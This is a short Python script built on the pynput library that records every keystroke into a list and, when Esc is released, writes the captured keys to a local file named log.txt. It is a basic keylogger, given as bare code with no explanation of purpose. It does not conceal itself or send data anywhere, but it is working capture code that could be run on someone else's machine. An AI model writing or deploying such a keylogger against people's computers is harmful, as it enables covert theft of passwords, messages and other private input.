import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
	global keys, count

	if key == Key.esc:
		pass
	elif key == Key.shift:
		pass
	elif key == Key.backspace:
		keys.pop()
	elif key == Key.space:
		keys.append(' ')
	else:
		keys.append(key)

def on_release(key):
	if key == Key.esc:
		with open("log.txt", "w") as f:
			for i in range(len(keys)):
				f.write(str(keys[i]).replace("'", ""))
		f.close()
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
